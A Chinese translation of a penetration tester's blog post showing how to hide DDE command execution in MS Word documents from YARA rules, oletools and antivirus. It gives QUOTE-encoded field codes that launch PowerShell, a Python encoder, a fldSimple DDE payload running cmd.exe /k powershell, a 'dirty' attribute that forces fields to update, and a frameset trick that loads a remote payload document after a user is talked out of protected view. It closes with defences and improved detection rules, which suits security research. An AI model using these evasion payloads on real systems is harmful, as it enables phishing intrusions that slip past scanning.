> 原文链接: https://www.anquanke.com//post/id/87198 


# 【技术分享】MSWord：如何混淆域代码绕过基于Yara规则的DDEAUTO检测


                                阅读量   
                                **122026**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：staaldraad.github.io
                                <br>原文地址：[https://staaldraad.github.io/pentest/phishing/dde/2017/10/23/msword-field-codes/](https://staaldraad.github.io/pentest/phishing/dde/2017/10/23/msword-field-codes/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t01a8167ac03779c44f.jpg)](https://p3.ssl.qhimg.com/t01a8167ac03779c44f.jpg)

译者：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**一、前言**

几周前，我和Saif El-Sherei在[SensePost](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/)博客上发表了一篇文章，介绍了DDE（Dynamic Data Exchange，动态数据交换）的相关技术，以及如何利用这种技术，在不启用宏功能的MSWord上实现命令执行。我们没有想到这篇文章会吸引那么多人的目光。从那时起，钓鱼及恶意软件攻击行动中开始使用DDE技术，合法的红蓝对抗中也出现了这种技术的身影。随着DDE大规模用于攻击行动中，相应的检测机制也逐步完善，大多数反病毒软件引擎中已经包含基本的DDE检测功能。这类检测技术大多都基于YARA规则，可以识别.docx以及.doc文件中的DDE或者DDEAUTO字符串。在这种情况下，我想知道能否找到混淆文档中DDE特征的方法。现实中已经有人着手尝试过，比如[这篇文章](https://furoner.wordpress.com/2017/10/17/macroless-malware-that-avoids-detection-with-yara-rule/amp/)中，攻击者修改了DDE字符串的大小写状态，将特征字符串切割为多行形式，以规避基于Yara规则的检测技术。

在这篇文章中，我会与大家分享我在混淆特征及绕过检测方面的经验，希望这些经验能给攻防双方提供参考。

本文主要内容为：

**1、如何混淆攻击载荷；**

**2、如何隐藏DDE/DDEAUTO特征；**

**3、应对方法。**



**二、如何混淆攻击载荷**

在研究如何混淆DDE以及DDEAUTO域代码（Field Code）的方法之前，我想先重点研究一下如何混淆攻击载荷。之所以这么做，主要有两方面原因。其一，攻击载荷为一串简单的字符串，而不是一个保留的域代码，这意味着混淆载荷不大可能会破坏载荷的功能。其二，我们有更多的空间可以用来混淆，隐藏三个字符（DDE）会比隐藏包含255个字符的字符串难度更大。

由于这方面技术会涉及到域代码相关知识，我们可以尝试下能否在这一领域找到其他可用的混淆点。快速搜索“list field codes word”关键词后，我们找到了微软公布的一份[支持文档](https://support.office.com/en-us/article/List-of-field-codes-in-Word-1ad6d91a-55a7-4a8d-b535-cf7888659a51)，这份文档中列出了Word支持的所有域代码，对我们而言非常有用。花了一些时间遍历这些域代码后，我从中找到了一个可能用得上的代码，即QUOTE域。微软对这个域的描述为：“Quote域可以将特定的文本插入文档中”。这听起来非常有用，因为我们的目的是寻找能够修改载荷字符串的方法，而利用QUOTE域，我们可以修改字符串，并将其插入文档中。

顺便提一句，需要注意的是，我们可以在Word中使用嵌套形式的域代码，例如，关于QUOTE域，我们可以这么使用：

```
`{` QUOTE `{` IF `{` DATE @ "M" `}` = 1 "12" "`{`= `{` DATE @ "M" `}` -1 `}`/1/03" @ "MMMM"`}` `}`
```

上面例子中包含嵌套形式的域代码，QUOTE域内部包含IF域代码，其内容会取决于FORMULA(=)的处理结果，最终包含DATE或者经过格式化的日期数据。

我们可以向QUOTE域提供某个字符的数字编码，它会将这个编码转换为对应的字符（我并没有找到关于这个技术点的参考资料）。比如，如果我们想要得到数字编码为65所对应的那个字符，我们可以在Word中使用如下域：

```
`{` QUOTE 65 `}`
```

这段代码最终会显示为字符A，而不是数字65，这正是我们希望得到的结果。现在我们可以将攻击载荷重新以数字形式进行编码，这样Word在执行我们的DDE之前会自动将数字编码转换为字符串。完整的代码如下：



```
`{`SET c "`{`QUOTE 65 65 65 65`}`"`}`
`{`SET d "`{`QUOTE 71 71 71 71`}`"`}`
`{`DDE `{`REF c`}` `{`REF d`}``}`
```

上面这段内容等价于：

```
`{`DDE "AAAA" "GGGG"`}`
```

此时，我们可以充分发挥想象力，在载荷中将AAAA以及GGGG替换为前面的那段代码。为了使替换过程更加便捷，我编写了一个python脚本，可以将给定的字符串转换为等效的QUOTE域代码。



```
#!/usr/env/python
print("Converts a string to the `{`QUOTE`}` Field code")
st = raw_input("String to convert: ")
out = "`{` QUOTE "
for c in st:
    out += (" %s"%ord(c))
out += " `}`"
print(out)
```

如果想要弹出powershell，我们可以使用如下代码：



```
`{`SET C "`{`QUOTE 67 58 92 92 80 114 111 103 114 97 109 115 92 92 77 105 99 114 111 115 111 102 116 92 92 79 102 102 105 99 101 92 92 77 83 87 111 114 100 46 101 120 101 92 92 46 46 92 92 46 46 92 92 46 46 92 92 46 46 92 92 119 105 110 100 111 119 115 92 92 115 121 115 116 101 109 51 50 92 92 119 105 110 100 111 119 115 112 111 119 101 114 115 104 101 108 108 92 92 118 49 46 48 92 92 112 111 119 101 114 115 104 101 108 108 46 101 120 101`}` "`}`
`{`DDE `{`REF C`}`  "a"`}`
```

**2.1 Dirty链接**

顾名思义，DDEAUTO在文档打开时会自动更新。然而，除非我们在文档上设置了“更新链接（update links）”属性，否则并不是所有的域代码都会自动更新。为了实现这一点，我们需要将我们所使用的链接标记为“dirty”链接（已过时链接），或者更改文档属性，让文档可以自动更新链接（可能会有其他方法比我的方法更加简单）。

具体方法是，当我们创建.docx文档后，可以使用归档管理器软件打开这个文档，然后编辑其中的document.xml文件。为了将链接标记为待更新的dirty链接，我们需要找到文件中以&lt;w:fldChar&gt;开头的所有字符串，添加w:dirty="true"字符串，如下所示：

```
&lt;w:fldChar w:fldCharType="begin" w:dirty="true"/&gt;
```

然后，保存**document.xml**，更新压缩包。现在当用户打开.docx文档时，所有的链接都会自动更新。同时，用户看到的是更加整洁的“Do you want to update”对话框，提示是否更新域。

[![](https://p4.ssl.qhimg.com/t0175a03a91c3c96d10.png)](https://p4.ssl.qhimg.com/t0175a03a91c3c96d10.png)

**2.2 处理结果**

最大的问题是，使用QUOTE后，我们是否能达到很好的效果？事实证明的确如此。我们使用了会弹出powershell对话框的Word样本进行测试（我认为如果Word会弹出Powershell对话框，那么这种行为显然是非常可疑的），结果发现VirusTotal上只有1/59的检测率。

[![](https://p3.ssl.qhimg.com/t013674764516b2966f.png)](https://p3.ssl.qhimg.com/t013674764516b2966f.png)

通常情况下，将.docx文件重新保存为.doc文件后，我们依然能得到同样的代码执行效果。然而，使用这种方法时，如果你想打开.doc文档，你会看到一个Error! No application specified错误对话框，这是因为嵌套的域代码没有正确更新的原因。可能会有一种方法能强制更新所有的域代码，然而受我个人知识面所限，我无法在Word中找到这类方法。



**三、如何隐藏DDE特征**

接下来另一个挑战是，如何隐藏并规避现有的检测机制，这类检测机制包括基于YARA规则以及基于DDE链接提取的技术。

**3.1 YARA规则**

据我所知，大多数YARA规则的原理都是在某个.docx文档的instrText元素中查找DDE或者DDEAUTO特征（我着重研究的是.docx文档，因为这类文档手动修改起来更加方便）。第一个YARA规则由[Nviso Labs](https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/)公布，包含如下正则表达式：

```
/&lt;w:fldChars+?w:fldCharType="begin"/&gt;.+?b[Dd][Dd][Ee]b.+?&lt;w:fldChars+?w:fldCharType="end"/&gt;/
```

这条规则能有效检测出第一批恶意文档，然而对于后续出现的多行变种文档而言却无能为力。在多行变种文档出现之前，我还找到了这个正则表达式中存在的另一个问题，并已将其反馈给Didier Stevens。如果你仔细研究Office Open XML文件格式规范时，你会发现fldChar域为复杂域（Complex Field）类型，可以包含可选属性。添加可选属性后，我们就能破坏上述YARA规则，无需利用DDEAUTO，只需使用DDE就能实施攻击。这个可选属性为dirty属性，只要将属性值设为true，就能强制更新域代码，因为规范中提到这样一句话：“（属性值为true）表明某个应用程序已标记该域，代表自上次保存以来，当前记录已发生更改，不再有效。”

我在前面提到的QUOTE域中也用到过这个属性，用来强制更新域值。与之前的步骤类似，我们只需要手动修改.docx文档，将该属性添加到文档中即可：



```
&lt;w:r&gt;
   &lt;w:fldChar w:fldCharType="begin" w:dirty="true"/&gt;
&lt;/w:r&gt;
```

上述正则表达式无法匹配这种可选属性，因此无法检测这类变种。我向Didier提交了新的匹配规则，新的规则可以适配可选属性，也可以适配包含任意空格符的XML数据：

```
&lt;w:fldChars+?w:fldCharType="begin"s+?(w:dirty="(true|false)")?s+?/&gt;.+?b[Dd][Dd][Ee]b.+?&lt;w:fldChars+?w:fldCharType="end"/&gt;
```

**3.2 Oletools：msodde.py**

[decalage2](https://twitter.com/decalage2)写了一个python工具：[python-oletools](https://github.com/decalage2/oletools)，这个工具非常有趣，目前我还没有用它来测试一下我们构造的攻击载荷。这个工具可以从使用DDE攻击方法的所有已知变种中提取DDE载荷。如果利用这个工具来检测我们构造的QUOTE变种，我们发现它还是可以提取到相关链接，表明文档中仍然包含DDE攻击载荷：

[![](https://p3.ssl.qhimg.com/t019ebae9e15ac4742a.png)](https://p3.ssl.qhimg.com/t019ebae9e15ac4742a.png)

虽然还需要花点精力，我们还是可以解码这些QUOTE字符，将其转换为待执行的字符串。那么，我们如何绕过这个工具？

回到Office Open XML文件格式（我非常喜欢阅读规范文档），我们发现还有另一个元素可以用来引用域代码。目前为止，我们用到过“Complex Field”类型的fldChar，然而，还有个“Simple Field”类型的fldSimple可以为我们所用。与fldChar不同的是，fldSimple元素并没有包含&lt;w:instrText&gt;子元素，实际上，它会将域代码作为属性加以使用，如w:instr="FIELD CODE"。

规范文档中提到如下一个例子：



```
&lt;w:fldSimple w:instr="AUTHOR" w:fldLock="true"&gt;
    &lt;w:r&gt;
        &lt;w:t&gt;Rex Jaeschke&lt;/w:t&gt;
    &lt;/w:r&gt;
&lt;/w:fldSimple&gt;
```

稍加修改后，这段示例代码就可以用于DDE攻击方法中，比如，我们可以嵌入载荷数据，如下所示：



```
&lt;w:fldSimple w:instr='DDE "C:\WINDOWS\system32\cmd.exe" "/k powershell.exe"' w:dirty="true"&gt;
    &lt;w:r&gt;
        &lt;w:t&gt;Pew&lt;/w:t&gt;
    &lt;/w:r&gt;
&lt;/w:fldSimple&gt;
```

使用这种方法，我们还是能得到自动执行的DDE载荷，并且也能绕过Oletools工具：

[![](https://p4.ssl.qhimg.com/t01f54d2075db39e8ad.png)](https://p4.ssl.qhimg.com/t01f54d2075db39e8ad.png)

我已经向oletools发起了[Pull请求](https://github.com/decalage2/oletools/pull/205)，希望能检测在fldSimple元素中嵌入的DDE链接。

[![](https://p4.ssl.qhimg.com/t01874f893f80241cbe.png)](https://p4.ssl.qhimg.com/t01874f893f80241cbe.png)

同样，这种方法在[规避反病毒检测](https://www.virustotal.com/#/file/0f8bc14e32928ec882948977b25483a993fb8b4d9c8bc542aa13ecfbde785837/detection)方面也取得了不俗的效果。

[![](https://p5.ssl.qhimg.com/t018e96eb472a90d056.png)](https://p5.ssl.qhimg.com/t018e96eb472a90d056.png)

需要注意的是，一旦载荷执行，基于行为检测的反病毒软件应该会检测到恶意行为，因此可以说，这些检测结果表明，我们可以绕过反病毒软件的静态扫描。

**3.3 副作用**

使用fldSimple时会存在一些副作用。如果你决定使用DDEAUTO方法，同时也用到了w:dirty="true"，那么当终端用户想执行DDE应用程序时，他们会看到3个提示对话框（我不明白为什么是3个对话框，而不是2个对话框）。与普通方法相对比，这种情况下用户需要多次点击对话框中的“yes”按钮。

有趣的是，使用fldSimple以及**c:\windows\system32\cmd.exe /k powershell**来启动powershell时，powershell会在cmd窗口内部运行，你可以直接进入powershell控制台。这种情况与在已有的cmd实例中运行powershell一致，但与常见的DDE场景不同（普通DDE会同时生成cmd以及powershell）。与此同时，你会得到一个无法加载PSRedline模块的提示信息：“Cannot load PSReadline module. Console is running without PSReadline”，如下图所示。感兴趣的读者可以进一步挖掘这个信息。

[![](https://p5.ssl.qhimg.com/t019616800ff7296ecc.png)](https://p5.ssl.qhimg.com/t019616800ff7296ecc.png)

**3.4 无DDE**

现在最大的挑战来了，在文档中我们有没有可能完全不包含DDE或者DDEAUTO特征？答案是肯定的，并且这一点对社会工程学方法大有好处。MSWord考虑得非常周到，会提示用户禁用受保护的试图（protected view）以便查看文档内容。

为了完成这个任务，我们可以使用另一个传统（legacy）功能。在历史上，微软曾将Word设计为可以处理与任何文本有关的一站式应用程序，其中就包含创建Web页面功能。Word曾经是编写HTML的一种IDE工具，虽然生成的HTML不是特别优雅，但也能正常工作。当时引入的一个特性就是frames（框架）以及framesets（框架集）。在Word中，我们可以使用frames来将不同的HTML/Text页面加载到frames中，并且HTML会被自动解析，转化为Word格式的内容。在Word 2016或者更早版本的Word中，程序界面中已经不再包含这种功能，然而程序底层依然包含相应的解析例程。这意味着如果我们创建包含嵌入式frames的文档，Word仍然会自动处理这些数据。

想要插入frameset的话，我们需要编辑纯净版的.docx文档。首先，解压缩这个文档，然后打开其中的webSettings.xml文件。接下来我们可以修改并添加新的XML元素frameset：



```
&lt;w:frameset&gt;
    &lt;w:framesetSplitbar&gt;
        &lt;w:w w:val="60"/&gt;
        &lt;w:color w:val="auto"/&gt;
        &lt;w:noBorder/&gt;
    &lt;/w:framesetSplitbar&gt;
    &lt;w:frameset&gt;
        &lt;w:frame&gt;
            &lt;w:name w:val="1"/&gt;
            &lt;w:sourceFileName r:id="rId1"/&gt;
            &lt;w:linkedToFile/&gt;
        &lt;/w:frame&gt;
    &lt;/w:frameset&gt;
&lt;/w:frameset&gt;
```

这段内容应该插入到已有的&lt;w:webSettings&gt;元素内部，紧靠在&lt;w:optimizeForBrowser/&gt;&lt;w:allowPNG/&gt;元素之前。接下来，我们需要添加rId1关系（Relationship），将我们的文档链接到外部文档。我们需要将名为webSettings.xml.rels的新文件添加到word/_rels/目录中，以完成这个任务。

该文件的内容如下所示：



```
&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
&lt;Relationships 
    xmlns="http://schemas.openxmlformats.org/package/2006/relationships"&gt;
    &lt;Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="http://x.x.x.x/simple.docx" TargetMode="External"/&gt;
&lt;/Relationships&gt;
```

我们链接的外部文档为包含DDE攻击载荷的.docx文件。这个例子中，我们会从地址为x.x.x.x的HTTP服务器加载simple.docx文件。首先，我们需要保存经过修改并已添加新内容的文件，然后更新整个.docx压缩包。现在，将经过修改的文档发给目标用户，等待用户打开。由于用户下载的文档包含MOTW（mark of the web）标记，因此该文档会在受保护视图状态下打开。然而，这种情况下，Word会检测到需要请求外部内容才能正确显示这个文件，因此会向用户提示：“链接的文件及其他功能已被禁用。要恢复此功能，你必须编辑此文件”。需要注意的是，这是来自Word的默认消息，我们没法操控这一点。

一旦用户禁用受保护的试图，Word会下载包含DDE攻击载荷的外部文档。这个文档不包含MOTW标记，会由Word负责解析，最终会触发正常的DDE消息。这种方法非常有用，可以夹带我们的DDE攻击载荷，而不会被反病毒软件扫描到。



**四、应对措施**

最好的应对措施应该是禁用自动更新链接功能，不要完全依赖反病毒软件。Will Dormannn（[@wdormann](https://twitter.com/wdormann)）提出了一种方法，可以更改已安装的Office应用程序配置，使Office忽略链接并禁用链接的自动更新，详情请参考[此处链接](https://gist.github.com/wdormann/732bb88d9b5dd5a66c9f1e1498f31a1b)。

我非常乐意尝试另一种防御机制，那就是在Windows 10秋季创造者更新中引入的[Windows Defender Exploit Guard](https://docs.microsoft.com/en-us/windows/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard)功能。这个功能可以阻止Word、Excel、Powerpoint生成子进程。这样不仅能阻止子进程创建，也能阻止DDE攻击以及嵌入式OLE攻击等。需要注意的是，Matt Nelson（[@enima0x3Attack](https://twitter.com/enigma0x3/)）已经证实，Outlook以及Access都不会添加到ASR（[Attack Surface Reduction](https://twitter.com/enigma0x3/status/922167827817287680)）的保护范围中。

前面提到过，我已经发起一个pull请求，希望更新oletools工具。目前，基于DDE或者DDEAUTO关键词的YARA规则大部分应该都能正常工作。如果你还坚持搜索类似powershell之类的关键词，我想你需要与时俱进，改变思维，才能跟上这个时代的节奏。
